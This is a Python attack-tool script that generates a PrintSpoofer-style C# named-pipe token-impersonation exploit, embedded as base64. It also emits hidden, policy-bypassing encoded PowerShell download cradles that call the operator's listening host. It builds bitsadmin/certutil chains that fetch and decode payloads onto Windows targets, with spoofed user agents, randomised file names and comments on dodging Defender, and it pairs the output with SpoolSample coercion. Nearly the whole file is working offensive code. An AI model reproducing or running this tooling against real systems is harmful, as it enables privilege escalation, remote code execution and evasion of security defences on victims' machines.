import os,sys
import base64
import argparse
from random import choice
from makehtml import copy
from makerunner import runner,gen,powershell_b64encode,makeoneliner,cradleps1
from makerunspace import certutil_b64encode

custom_agent = "1" #"0" #"1" #will make cradle pretty long - makes defender suspicious
#agent_string = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 Edg/94.0.992.38"
agent_string = "Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko"

proxy_kill = "0" #"0" #"1" #cannot coexist with proxy_steal
proxy_steal = "0" #"0" #"1" #requires admin priv, most likely to use for bitsadmin in system shell #bits proxy not tested to work :()

# proxy-safe - if both "1", choose proxy_kill
if proxy_kill == "1" and proxy_steal == "1":
    proxy_steal = "0"
if proxy_kill == "1":
    proxy_steal = "0"
if proxy_steal == "1":
    proxy_kill = "0"

obfuscate_bin = "1" #"0" #"1"
upload_spoolsample = "0" #"0" #"1" #default off - better to use makecompile to upload SpoolSample

def rand_word():
    lines = open('words.txt').read().splitlines()
    string1 = choice(lines)
    string2 = choice(lines)
    string3 = choice(lines)
    res = string1 + string2 + string3
    res = res.capitalize()
    return res

def writepipepipe(bitness,lhost,lport,ptype,binary,pipename,targethost,listenhost,jitcompile):
    pipepipefilename = "PipePipe.cs"

    pipename = pipename.replace('\\','\\\\') #prep for csharp
    binary = binary.replace('\\','\\\\') #prep for csharp

    upper = "dXNpbmcgU3lzdGVtOwp1c2luZyBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXM7CnVzaW5nIFN5c3RlbS5TZWN1cml0eS5QcmluY2lwYWw7CnVzaW5nIFN5c3RlbS5UZXh0OwoKbmFtZXNwYWNlIFByaW50U3Bvb2Zlcgp7CiAgICBwdWJsaWMgY2xhc3MgUHJvZ3JhbQogICAgewogICAgICAgIHB1YmxpYyBzdGF0aWMgdWludCBQSVBFX0FDQ0VTU19EVVBMRVggPSAweDM7CiAgICAgICAgcHVibGljIHN0YXRpYyB1aW50IFBJUEVfVFlQRV9CWVRFID0gMHgwOwogICAgICAgIHB1YmxpYyBzdGF0aWMgdWludCBQSVBFX1dBSVQgPSAweDA7CiAgICAgICAgcHVibGljIHN0YXRpYyB1aW50IFRPS0VOX0FMTF9BQ0NFU1MgPSAweEYwMUZGOwogICAgICAgIHB1YmxpYyBzdGF0aWMgdWludCBUT0tFTlVTRVIgPSAxOwogICAgICAgIHB1YmxpYyBzdGF0aWMgdWludCBTRUNVUklUWV9JTVBFUlNPTkFUSU9OID0gMjsKICAgICAgICBwdWJsaWMgc3RhdGljIHVpbnQgVE9LRU5fUFJJTUFSWSA9IDE7CgogICAgICAgIFtTdHJ1Y3RMYXlvdXQoTGF5b3V0S2luZC5TZXF1ZW50aWFsKV0KICAgICAgICBwdWJsaWMgc3RydWN0IFBST0NFU1NfSU5GT1JNQVRJT04KICAgICAgICB7CiAgICAgICAgICAgIHB1YmxpYyBJbnRQdHIgaFByb2Nlc3M7CiAgICAgICAgICAgIHB1YmxpYyBJbnRQdHIgaFRocmVhZDsKICAgICAgICAgICAgcHVibGljIGludCBkd1Byb2Nlc3NJZDsKICAgICAgICAgICAgcHVibGljIGludCBkd1RocmVhZElkOwogICAgICAgIH0KICAgICAgICBbU3RydWN0TGF5b3V0KExheW91dEtpbmQuU2VxdWVudGlhbCwgQ2hhclNldCA9IENoYXJTZXQuVW5pY29kZSldCiAgICAgICAgcHVibGljIHN0cnVjdCBTVEFSVFVQSU5GTwogICAgICAgIHsKICAgICAgICAgICAgcHVibGljIEludDMyIGNiOwogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIGxwUmVzZXJ2ZWQ7CiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgbHBEZXNrdG9wOwogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIGxwVGl0bGU7CiAgICAgICAgICAgIHB1YmxpYyBJbnQzMiBkd1g7CiAgICAgICAgICAgIHB1YmxpYyBJbnQzMiBkd1k7CiAgICAgICAgICAgIHB1YmxpYyBJbnQzMiBkd1hTaXplOwogICAgICAgICAgICBwdWJsaWMgSW50MzIgZHdZU2l6ZTsKICAgICAgICAgICAgcHVibGljIEludDMyIGR3WENvdW50Q2hhcnM7CiAgICAgICAgICAgIHB1YmxpYyBJbnQzMiBkd1lDb3VudENoYXJzOwogICAgICAgICAgICBwdWJsaWMgSW50MzIgZHdGaWxsQXR0cmlidXRlOwogICAgICAgICAgICBwdWJsaWMgSW50MzIgZHdGbGFnczsKICAgICAgICAgICAgcHVibGljIEludDE2IHdTaG93V2luZG93OwogICAgICAgICAgICBwdWJsaWMgSW50MTYgY2JSZXNlcnZlZDI7CiAgICAgICAgICAgIHB1YmxpYyBJbnRQdHIgbHBSZXNlcnZlZDI7CiAgICAgICAgICAgIHB1YmxpYyBJbnRQdHIgaFN0ZElucHV0OwogICAgICAgICAgICBwdWJsaWMgSW50UHRyIGhTdGRPdXRwdXQ7CiAgICAgICAgICAgIHB1YmxpYyBJbnRQdHIgaFN0ZEVycm9yOwogICAgICAgIH0KCiAgICAgICAgcHVibGljIGVudW0gQ3JlYXRpb25GbGFncwogICAgICAgIHsKICAgICAgICAgICAgRGVmYXVsdEVycm9yTW9kZSA9IDB4MDQwMDAwMDAsCiAgICAgICAgICAgIE5ld0NvbnNvbGUgPSAweDAwMDAwMDEwLAogICAgICAgICAgICBOZXdQcm9jZXNzR3JvdXAgPSAweDAwMDAwMjAwLAogICAgICAgICAgICBTZXBhcmF0ZVdPV1ZETSA9IDB4MDAwMDA4MDAsCiAgICAgICAgICAgIFN1c3BlbmRlZCA9IDB4MDAwMDAwMDQsCiAgICAgICAgICAgIFVuaWNvZGVFbnZpcm9ubWVudCA9IDB4MDAwMDA0MDAsCiAgICAgICAgICAgIEV4dGVuZGVkU3RhcnR1cEluZm9QcmVzZW50ID0gMHgwMDA4MDAwMAogICAgICAgIH0KICAgICAgICBwdWJsaWMgZW51bSBMb2dvbkZsYWdzCiAgICAgICAgewogICAgICAgICAgICBXaXRoUHJvZmlsZSA9IDEsCiAgICAgICAgICAgIE5ldENyZWRlbnRpYWxzT25seQogICAgICAgIH0KCiAgICAgICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldCiAgICAgICAgc3RhdGljIGV4dGVybiBJbnRQdHIgQ3JlYXRlTmFtZWRQaXBlKHN0cmluZyBscE5hbWUsIHVpbnQgZHdPcGVuTW9kZSwgdWludCBkd1BpcGVNb2RlLCB1aW50IG5NYXhJbnN0YW5jZXMsIHVpbnQgbk91dEJ1ZmZlclNpemUsIHVpbnQgbkluQnVmZmVyU2l6ZSwgdWludCBuRGVmYXVsdFRpbWVPdXQsIEludFB0ciBscFNlY3VyaXR5QXR0cmlidXRlcyk7CgogICAgICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIpXQogICAgICAgIHN0YXRpYyBleHRlcm4gYm9vbCBDb25uZWN0TmFtZWRQaXBlKEludFB0ciBoTmFtZWRQaXBlLCBJbnRQdHIgbHBPdmVybGFwcGVkKTsKCiAgICAgICAgW0RsbEltcG9ydCgiQWR2YXBpMzIuZGxsIildCiAgICAgICAgc3RhdGljIGV4dGVybiBib29sIEltcGVyc29uYXRlTmFtZWRQaXBlQ2xpZW50KEludFB0ciBoTmFtZWRQaXBlKTsKCiAgICAgICAgW0RsbEltcG9ydCgiYWR2YXBpMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldCiAgICAgICAgc3RhdGljIGV4dGVybiBib29sIE9wZW5UaHJlYWRUb2tlbihJbnRQdHIgVGhyZWFkSGFuZGxlLCB1aW50IERlc2lyZWRBY2Nlc3MsIGJvb2wgT3BlbkFzU2VsZiwgb3V0IEludFB0ciBUb2tlbkhhbmRsZSk7CgogICAgICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIpXQogICAgICAgIHN0YXRpYyBleHRlcm4gSW50UHRyIEdldEN1cnJlbnRUaHJlYWQoKTsKCiAgICAgICAgW0RsbEltcG9ydCgiYWR2YXBpMzIiLCBTZXRMYXN0RXJyb3IgPSB0cnVlLCBDaGFyU2V0ID0gQ2hhclNldC5Vbmljb2RlKV0KICAgICAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBib29sIENyZWF0ZVByb2Nlc3NXaXRoVG9rZW5XKEludFB0ciBoVG9rZW4sIExvZ29uRmxhZ3MgZHdMb2dvbkZsYWdzLCBzdHJpbmcgbHBBcHBsaWNhdGlvbk5hbWUsIHN0cmluZyBscENvbW1hbmRMaW5lLCBDcmVhdGlvbkZsYWdzIGR3Q3JlYXRpb25GbGFncywgSW50UHRyIGxwRW52aXJvbm1lbnQsIHN0cmluZyBscEN1cnJlbnREaXJlY3RvcnksIFtJbl0gcmVmIFNUQVJUVVBJTkZPIGxwU3RhcnR1cEluZm8sIG91dCBQUk9DRVNTX0lORk9STUFUSU9OIGxwUHJvY2Vzc0luZm9ybWF0aW9uKTsKCiAgICAgICAgW0RsbEltcG9ydCgiYWR2YXBpMzIuZGxsIiwgQ2hhclNldCA9IENoYXJTZXQuQXV0bywgU2V0TGFzdEVycm9yID0gdHJ1ZSldCiAgICAgICAgcHVibGljIGV4dGVybiBzdGF0aWMgYm9vbCBEdXBsaWNhdGVUb2tlbkV4KEludFB0ciBoRXhpc3RpbmdUb2tlbiwgdWludCBkd0Rlc2lyZWRBY2Nlc3MsIEludFB0ciBscFRva2VuQXR0cmlidXRlcywgdWludCBJbXBlcnNvbmF0aW9uTGV2ZWwsIHVpbnQgVG9rZW5UeXBlLCBvdXQgSW50UHRyIHBoTmV3VG9rZW4pOwoKICAgICAgICBbRGxsSW1wb3J0KCJhZHZhcGkzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0KICAgICAgICBzdGF0aWMgZXh0ZXJuIGJvb2wgUmV2ZXJ0VG9TZWxmKCk7CgogICAgICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIpXQogICAgICAgIHN0YXRpYyBleHRlcm4gdWludCBHZXRTeXN0ZW1EaXJlY3RvcnkoW091dF0gU3RyaW5nQnVpbGRlciBscEJ1ZmZlciwgdWludCB1U2l6ZSk7CgogICAgICAgIFtEbGxJbXBvcnQoInVzZXJlbnYuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldCiAgICAgICAgc3RhdGljIGV4dGVybiBib29sIENyZWF0ZUVudmlyb25tZW50QmxvY2sob3V0IEludFB0ciBscEVudmlyb25tZW50LCBJbnRQdHIgaFRva2VuLCBib29sIGJJbmhlcml0KTsKCiAgICAgICAgW0RsbEltcG9ydCgiYWR2YXBpMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldCiAgICAgICAgc3RhdGljIGV4dGVybiBib29sIEdldFRva2VuSW5mb3JtYXRpb24oSW50UHRyIFRva2VuSGFuZGxlLCB1aW50IFRva2VuSW5mb3JtYXRpb25DbGFzcywgSW50UHRyIFRva2VuSW5mb3JtYXRpb24sIGludCBUb2tlbkluZm9ybWF0aW9uTGVuZ3RoLCBvdXQgaW50IFJldHVybkxlbmd0aCk7CiAgICAgICAgW1N0cnVjdExheW91dChMYXlvdXRLaW5kLlNlcXVlbnRpYWwpXQogICAgICAgIHB1YmxpYyBzdHJ1Y3QgU0lEX0FORF9BVFRSSUJVVEVTCiAgICAgICAgewogICAgICAgICAgICBwdWJsaWMgSW50UHRyIFNpZDsgcHVibGljIGludCBBdHRyaWJ1dGVzOwogICAgICAgIH0KICAgICAgICBwdWJsaWMgc3RydWN0IFRPS0VOX1VTRVIKICAgICAgICB7CiAgICAgICAgICAgIHB1YmxpYyBTSURfQU5EX0FUVFJJQlVURVMgVXNlcjsKICAgICAgICB9CiAgICAgICAgW0RsbEltcG9ydCgiYWR2YXBpMzIiLCBDaGFyU2V0ID0gQ2hhclNldC5BdXRvLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0KICAgICAgICBzdGF0aWMgZXh0ZXJuIGJvb2wgQ29udmVydFNpZFRvU3RyaW5nU2lkKEludFB0ciBwU0lELCBvdXQgSW50UHRyIHB0clNpZCk7CiAgICAgICAgcHVibGljIHN0YXRpYyB2b2lkIE1haW4oc3RyaW5nW10gYXJncykKICAgICAgICB7CiAgICAgICAgICAgIC8vIFBhcnNlIGFyZ3VtZW50cyAocGlwZSBuYW1lKQogICAgICAgICAgICAvL2lmIChhcmdzLkxlbmd0aCAhPSAxKQogICAgICAgICAgICAvL3sKICAgICAgICAgICAgLy8gICAgQ29uc29sZS5Xcml0ZUxpbmUoIlBsZWFzZSBlbnRlciB0aGUgcGlwZSBuYW1lIHRvIGJlIHVzZWQgYW5kIHRoZSBiaW5hcnkgdG8gdHJpZ2dlciBhcyBhcmd1bWVudHMuXG5FeGFtcGxlOiAuXFxQcmludFNwb29mZXIuZXhlIFxcXFwuXFxwaXBlXFx0ZXN0XFxwaXBlXFxzcG9vbHNzIGM6XFx3aW5kb3dzXFx0YXNrc1xcYmluLmV4ZSIpOwogICAgICAgICAgICAvLyAgICByZXR1cm47CiAgICAgICAgICAgIC8vfQ=="
    lower = "ICAgICAgICAgICAgLy8gQ3JlYXRlIG91ciBuYW1lZCBwaXBlCiAgICAgICAgICAgIEludFB0ciBoUGlwZSA9IENyZWF0ZU5hbWVkUGlwZShwaXBlTmFtZSwgUElQRV9BQ0NFU1NfRFVQTEVYLCBQSVBFX1RZUEVfQllURSB8IFBJUEVfV0FJVCwgMTAsIDB4MTAwMCwgMHgxMDAwLCAwLCBJbnRQdHIuWmVybyk7CgogICAgICAgICAgICAvLyBDb25uZWN0IHRvIG91ciBuYW1lZCBwaXBlIGFuZCB3YWl0IGZvciBhbm90aGVyIGNsaWVudCB0byBjb25uZWN0CiAgICAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCJXYWl0aW5nIGZvciBjbGllbnQgdG8gY29ubmVjdCB0byBuYW1lZCBwaXBlLi4uIik7CiAgICAgICAgICAgIGJvb2wgcmVzdWx0ID0gQ29ubmVjdE5hbWVkUGlwZShoUGlwZSwgSW50UHRyLlplcm8pOwoKICAgICAgICAgICAgLy8gSW1wZXJzb25hdGUgdGhlIHRva2VuIG9mIHRoZSBpbmNvbWluZyBjb25uZWN0aW9uCiAgICAgICAgICAgIHJlc3VsdCA9IEltcGVyc29uYXRlTmFtZWRQaXBlQ2xpZW50KGhQaXBlKTsKCiAgICAgICAgICAgIC8vIE9wZW4gYSBoYW5kbGUgb24gdGhlIGltcGVyc29uYXRlZCB0b2tlbgogICAgICAgICAgICBJbnRQdHIgdG9rZW5IYW5kbGU7CiAgICAgICAgICAgIHJlc3VsdCA9IE9wZW5UaHJlYWRUb2tlbihHZXRDdXJyZW50VGhyZWFkKCksIFRPS0VOX0FMTF9BQ0NFU1MsIGZhbHNlLCBvdXQgdG9rZW5IYW5kbGUpOwoKICAgICAgICAgICAgLy8gUHJpbnQgU0lEIG9mIGltcGVyc29uYXRlZCB0b2tlbgogICAgICAgICAgICBDb25zb2xlLldyaXRlTGluZSgiWytdIHRva2VuIG9wZW5lZDogIiArIHRva2VuSGFuZGxlLlRvU3RyaW5nKCkpOwogICAgICAgICAgICBpbnQgVG9rZW5JbmZMZW5ndGggPSAwOwogICAgICAgICAgICBHZXRUb2tlbkluZm9ybWF0aW9uKHRva2VuSGFuZGxlLCAxLCBJbnRQdHIuWmVybywgVG9rZW5JbmZMZW5ndGgsIG91dCBUb2tlbkluZkxlbmd0aCk7CiAgICAgICAgICAgIEludFB0ciBUb2tlbkluZm9ybWF0aW9uID0gTWFyc2hhbC5BbGxvY0hHbG9iYWwoKEludFB0cilUb2tlbkluZkxlbmd0aCk7CiAgICAgICAgICAgIEdldFRva2VuSW5mb3JtYXRpb24odG9rZW5IYW5kbGUsIDEsIFRva2VuSW5mb3JtYXRpb24sIFRva2VuSW5mTGVuZ3RoLCBvdXQgVG9rZW5JbmZMZW5ndGgpOwogICAgICAgICAgICBUT0tFTl9VU0VSIFRva2VuVXNlciA9IChUT0tFTl9VU0VSKU1hcnNoYWwuUHRyVG9TdHJ1Y3R1cmUoVG9rZW5JbmZvcm1hdGlvbiwgdHlwZW9mKFRPS0VOX1VTRVIpKTsKICAgICAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUoIlsrXSB0b2tlbiB1c2VyIHNpZCBhZGRyZXNzOiAiICsgVG9rZW5Vc2VyLlVzZXIuU2lkLlRvU3RyaW5nKCkpOwogICAgICAgICAgICBJbnRQdHIgcHN0ciA9IEludFB0ci5aZXJvOwogICAgICAgICAgICBCb29sZWFuIG9rID0gQ29udmVydFNpZFRvU3RyaW5nU2lkKFRva2VuVXNlci5Vc2VyLlNpZCwgb3V0IHBzdHIpOwogICAgICAgICAgICBDb25zb2xlLldyaXRlTGluZSgiWytdIGNvbnZlcnQgc2lkIHRvIHN0cmluZzogIiArIG9rLlRvU3RyaW5nKCkpOwogICAgICAgICAgICBDb25zb2xlLldyaXRlTGluZSgiWytdIHBzdHI6ICIgKyBwc3RyLlRvU3RyaW5nKCkpOwogICAgICAgICAgICBzdHJpbmcgc2lkc3RyID0gTWFyc2hhbC5QdHJUb1N0cmluZ0F1dG8ocHN0cik7CiAgICAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCJbK10gc2lkIHN0cmluZzogIiArIHNpZHN0cik7CiAgICAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKEAiRm91bmQgc2lkIHswfSIsIHNpZHN0cik7CgogICAgICAgICAgICAvLyBEdXBsaWNhdGUgdGhlIHN0b2xlbiB0b2tlbgogICAgICAgICAgICBJbnRQdHIgc3lzVG9rZW4gPSBJbnRQdHIuWmVybzsKICAgICAgICAgICAgRHVwbGljYXRlVG9rZW5FeCh0b2tlbkhhbmRsZSwgVE9LRU5fQUxMX0FDQ0VTUywgSW50UHRyLlplcm8sIFNFQ1VSSVRZX0lNUEVSU09OQVRJT04sIFRPS0VOX1BSSU1BUlksIG91dCBzeXNUb2tlbik7CgogICAgICAgICAgICAvLyBDcmVhdGUgYW4gZW52aXJvbm1lbnQgYmxvY2sgZm9yIHRoZSBub24taW50ZXJhY3RpdmUgc2Vzc2lvbgogICAgICAgICAgICBJbnRQdHIgZW52ID0gSW50UHRyLlplcm87CiAgICAgICAgICAgIGJvb2wgcmVzID0gQ3JlYXRlRW52aXJvbm1lbnRCbG9jayhvdXQgZW52LCBzeXNUb2tlbiwgZmFsc2UpOwoKICAgICAgICAgICAgLy8gR2V0IHRoZSBpbXBlcnNvbmF0ZWQgaWRlbnRpdHkgYW5kIHJldmVydCB0byBzZWxmIHRvIGVuc3VyZSB3ZSBoYXZlIGltcGVyc29uYXRpb24gcHJpdnMKICAgICAgICAgICAgU3RyaW5nIG5hbWUgPSBXaW5kb3dzSWRlbnRpdHkuR2V0Q3VycmVudCgpLk5hbWU7CiAgICAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCQiSW1wZXJzb25hdGVkIHVzZXIgaXM6IHtuYW1lfS4iKTsKICAgICAgICAgICAgUmV2ZXJ0VG9TZWxmKCk7CgogICAgICAgICAgICAvLyBHZXQgdGhlIHN5c3RlbSBkaXJlY3RvcnkKICAgICAgICAgICAgU3RyaW5nQnVpbGRlciBzYlN5c3RlbURpciA9IG5ldyBTdHJpbmdCdWlsZGVyKDI1Nik7CiAgICAgICAgICAgIHVpbnQgcmVzMSA9IEdldFN5c3RlbURpcmVjdG9yeShzYlN5c3RlbURpciwgMjU2KTsKCiAgICAgICAgICAgIC8vIFNwYXduIGEgbmV3IHByb2Nlc3Mgd2l0aCB0aGUgZHVwbGljYXRlZCB0b2tlbiwgYSBkZXNrdG9wIHNlc3Npb24sIGFuZCB0aGUgY3JlYXRlZCBwcm9maWxlCiAgICAgICAgICAgIFBST0NFU1NfSU5GT1JNQVRJT04gcEluZm8gPSBuZXcgUFJPQ0VTU19JTkZPUk1BVElPTigpOwogICAgICAgICAgICBTVEFSVFVQSU5GTyBzSW5mbyA9IG5ldyBTVEFSVFVQSU5GTygpOwogICAgICAgICAgICBzSW5mby5jYiA9IE1hcnNoYWwuU2l6ZU9mKHNJbmZvKTsKICAgICAgICAgICAgc0luZm8ubHBEZXNrdG9wID0gIldpblN0YTBcXERlZmF1bHQiOwogICAgICAgICAgICBDcmVhdGVQcm9jZXNzV2l0aFRva2VuVyhzeXNUb2tlbiwgTG9nb25GbGFncy5XaXRoUHJvZmlsZSwgbnVsbCwgYmluVG9SdW4sIENyZWF0aW9uRmxhZ3MuVW5pY29kZUVudmlyb25tZW50LCBlbnYsIHNiU3lzdGVtRGlyLlRvU3RyaW5nKCksIHJlZiBzSW5mbywgb3V0IHBJbmZvKTsKICAgICAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUoJCJFeGVjdXRlZCAne2JpblRvUnVufScgd2l0aCBpbXBlcnNvbmF0ZWQgdG9rZW4hIik7CiAgICAgICAgfQogICAgfQp9"

    if ptype == "local":
        if binary == "0":
            print('[!] woops! pipepipe localised runner not proven to work! use -t remote! terminating!')
            sys.exit()
            '''
            runnerfilename = runner(lhost,lport,bitness)
            linercradle,liner = makeoneliner(runnerfilename)
            binargs = " -Win hidden -nonI -noP -Exe ByPass -ENC %s" % liner #note the space at start
            binname = "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe"

            pipedata = "string pipeName = \"%s\";" % pipename
            bindata = "string binToRun = \"%s\";" % (binname,binargs)
            '''
            pass
        else:
            pipedata = "string pipeName = \"%s\";" % pipename
            bindata = "string binToRun = \"%s\";" % (binary)
            pass
        pass 

    if ptype == "remote":
        if binary == "0":
            runnerfilename = runner(lhost,lport,bitness)
            fcradle,cradle = cradleps1(lhost,runnerfilename)
            target = "http://%s/%s" % (lhost,runnerfilename)
            target = cradle % target
            binargs = " -Win hidden -nonI -noP -Exe ByPass -ENC %s" % powershell_b64encode(target) #note the space at start
            binname = "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe"

            pipedata = "string pipeName = \"%s\";" % pipename
            bindata = "string binToRun = \"%s%s\";" % (binname,binargs)
            pass 
        else:
            pass
        pass

    with open(pipepipefilename,'w') as f:
        upper = base64.b64decode(upper).decode()
        lower = base64.b64decode(lower).decode()
        f.write(upper + "\n")
        f.write("            " + pipedata + "\n")
        f.write("            " + bindata + "\n")
        f.write(lower)
    f.close()

    print('[+] pipepipe cs written: %s' % pipepipefilename)
    return pipepipefilename
    pass

def makecombo_pipepipe(lhost,runfilename,pipename,targethost,targetpipename):
    #pipename = pipename.replace('\\','\\\\') #prep for printing to terminal
    if runfilename != "SpoolSampleZero.exe":
        exefilename = "%s.exe" % runfilename.split(".")[0].strip()
    else:
        exefilename = runfilename

    bitsjobname = rand_word()
    randtxtname = "%s.txt" % rand_word()
    randexename = "%s.exe" % rand_word()
    runwebroot = "/var/www/html/"
    loadpath_met = "c:\\\\windows\\\\tasks\\\\%s"
    loadpath_cmd = loadpath_met.replace("\\\\","\\")
    if runfilename == "SpoolSampleZero.exe":
        utilpath = 'cmd /c %s %s %s'
    else:
        utilpath = 'cmd /c %s'
    certutilcombo = "bitsadmin /Transfer myJob http://%s/%s %s && certutil -decode %s %s"
    if custom_agent == "0":
        certutilcombo_sub = "bitsadmin /Transfer %s http://%s/%s %s && del %s && certutil -decode %s %s"
    if custom_agent == "1":
        certutilcombo_sub = "bitsadmin /create /download %s && bitsadmin /setcustomheaders %s User-Agent:\"%s\" && bitsadmin /addFile %s http://%s/%s %s && bitsadmin /resume %s && ping 127.0.0.1 -n 10 > nul && bitsadmin /complete %s && del %s && certutil -decode %s %s"
    if proxy_steal == "1":
        certutilcombo_sub = "bitsadmin /util /setieproxy networkservice AUTODETECT && " + certutilcombo_sub

    certfilename = certutil_b64encode(runwebroot+exefilename)
    certfilepath_met = loadpath_met % randtxtname #certfilename
    certfilepath_cmd = loadpath_cmd % randtxtname #certfilename
    runfileroot = runwebroot + exefilename
    runfilepath_met = loadpath_met % randexename #runfilename
    runfilepath_cmd = loadpath_cmd % randexename #runfilename

    combo_one = certutilcombo % (lhost,certfilename,certfilepath_cmd,certfilepath_cmd,runfilepath_cmd)
    if custom_agent == "0":
        combo_one_sub = certutilcombo_sub % (bitsjobname,lhost,certfilename,certfilepath_cmd,runfilepath_cmd,certfilepath_cmd,runfilepath_cmd)
    if custom_agent == "1":
        combo_one_sub = certutilcombo_sub % (bitsjobname,bitsjobname,agent_string,bitsjobname,lhost,certfilename,certfilepath_cmd,bitsjobname,bitsjobname,runfilepath_cmd,certfilepath_cmd,runfilepath_cmd)
    if runfilename == "SpoolSampleZero.exe":
        combo_two = utilpath % (runfilepath_cmd,targethost,targetpipename)
    else:
        combo_two = utilpath % (runfilepath_cmd) # no need to pass pipename - already in csharp code
    combo_break = combo_one + " && " + combo_two
    combo_break_sub = combo_one_sub + " && " + combo_two

    copy(certfilename,runwebroot,certfilename)
    print('[*] upload:\nupload %s %s' % (runfileroot,runfilepath_met)) 
    print(combo_one)
    print(combo_one_sub)
    print('[*] check:\ndir %s' % (runfilepath_cmd))
    if runfilename == "SpoolSampleZero.exe":
        print('[*] use:\n%s ' % (combo_two))
    else:
        print('[*] use (only with impersonation privileges!):\n%s ' % (combo_two))
    print('[!] c-c-c-combo breaker (cmd only!) (only with impersonation privileges!) (sub):\n%s' % combo_break_sub)
    
    return combo_break,combo_break_sub
    pass

def makepipepipe(bitness,lhost,lport,ptype,binary,pipename,targethost,listenhost,jitcompile):
    targetpipe = pipename.split("\\pipe\\spoolss")[0].split("\\\\.\\pipe\\")[1]
    listenpipe = "%s/pipe/%s" % (listenhost,targetpipe)
    print('[+] listening pipename (usage): %s' % (listenpipe))

    if ptype == "local":
        if binary == "0":
            print('[!] no binary specified + local option -> localised run.txt will be used!\n')
            # proceed to make pipepipe with localised run.txt -- tested, doesn't work. encoded string too long!
        if binary != "0":
            if jitcompile == "0":
                if "c:\\" not in binary:
                    print('[!] provide full path! e.g. c:\\windows\\tasks\\bin.exe . terminating!')
                    sys.exit()
                else:
                    print('[!] local pre-compiled option chosen! make sure victim %s exists!' % binary)
                    # proceed to make pipepipe with binary path
                    pass
            if jitcompile == "1":
                if binary not in ("Hollow","UACHelper"):
                    if binary == "SharpUp":
                        print('[!] SharpUp only compatible with pre-compiled binary! -t remote! terminating!')
                        sys.exit()
                else:
                    # proceed to compile binary and use bitsadmin+certutil to load on victim
                    pass
                    if obfuscate_bin == "1":
                        pass
            pass

    if ptype == "remote":
        if binary == "0":
            print('[!] no binary specified + remote option -> remote callback to run.txt will be used!\n')
            # proceed to make pipepipe that calls back to run.txt
        if binary != "0":
            if jitcompile == "0":
                if obfuscate_bin == "1":
                    binname = "%s.txt" % binary
                else:
                    binname = "%s.exe" % binary
                #print('[!] remote pre-compiled option chosen! make sure /var/www/html/%s exists!' % binname)
                print('[!] remote pre-compiled option not yet available! terminating!')
                sys.exit()
                # proceed to make pipepipe that calls back to binname - unlikely to work with .exe binaries - but maybe can work with dll!
            if jitcompile == "1":
                if binary not in ("Hollow","UACHelper"):
                    if binary == "SharpUp":
                        print('[!] SharpUp can\'t be compiled on the fly! use -j 0! terminating!')
                        sys.exit()
                    else:
                        print('[!] remote jit-compiled option not yet available! terminating!')
                        sys.exit()
                        # proceed to compile binary and place in /var/www/html - to explore dll option
                        pass 
                pass
            pass
        pass

    pipepipefilename = writepipepipe(bitness,lhost,lport,ptype,binary,pipename,targethost,listenhost,jitcompile)
    csfilepath = "/home/kali/data/PipePipe/PipePipe/"
    csfilename = "Program.cs"
    exewebroot = "/var/www/html/"
    exefilename = "PipePipe.exe"

    copy(pipepipefilename,csfilepath,csfilename)
    input("[!] build %s%s with bitness %s .. press enter to continue\n" % (csfilepath,csfilename,bitness))
    if bitness == "64":
        copy("%sbin/x64/Release/%s" % (csfilepath,exefilename),exewebroot,exefilename)
    if bitness == "32":
        copy("%sbin/x86/Release/%s" % (csfilepath,exefilename),exewebroot,exefilename)

    makecombo_pipepipe(lhost,pipepipefilename,pipename,targethost,listenpipe)
    print('\n[*] usage with SpoolSampleZero:\n.\\SpoolSampleZero.exe %s %s' % (targethost,listenpipe))

    if upload_spoolsample == "1":
        input("[*] upload_spoolsample chosen -> upload and execute PipePipe before proceeding .. press enter to continue")
        makecombo_pipepipe(lhost,"SpoolSampleZero.exe",pipename,targethost,listenpipe)
    pass


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('--arch','-a',required=True,dest='arch',help='32 or 64')
    parser.add_argument('--lhost','-l',required=True,dest='host',help='lhost')
    parser.add_argument('--lport','-p',required=True,dest='port',help='lport')
    parser.add_argument('--type','-t',required=True,dest='ptype',help='remote or local')
    parser.add_argument('--binary','-b',required=False,dest='binary',help='SharpUp, Hollow, or UACHelper') #'any target binary on victim, e.g. c:\\windows\\tasks\\bin.exe') #, or Runspace')
    parser.add_argument('--pipe','-s',required=False,dest='pipename',help='any arbitrary pipe name that targets \\pipe\\spoolss, e.g. \\\\.\\pipe\\test\\pipe\\spoolss') # default: \\\\.\\pipe\\test\\pipe\\spoolss
    parser.add_argument('--target','-n',required=False,dest='targethost',help='target hostname, e.g. rdc01') # default: [TARGETHOST]
    parser.add_argument('--hostname','-m',required=False,dest='listenhost',help='listening hostname, e.g. app01') # default: [LISTENHOST]
    parser.add_argument('--jit','-j',required=False,dest='justintime',help='0 or 1, just-in-time compile for -t local option')

    args = parser.parse_args()
    
    bitness = args.arch
    lhost = args.host
    lport = args.port
    ptype = args.ptype
    binary = args.binary
    pipename = args.pipename
    targethost = args.targethost
    listenhost = args.listenhost
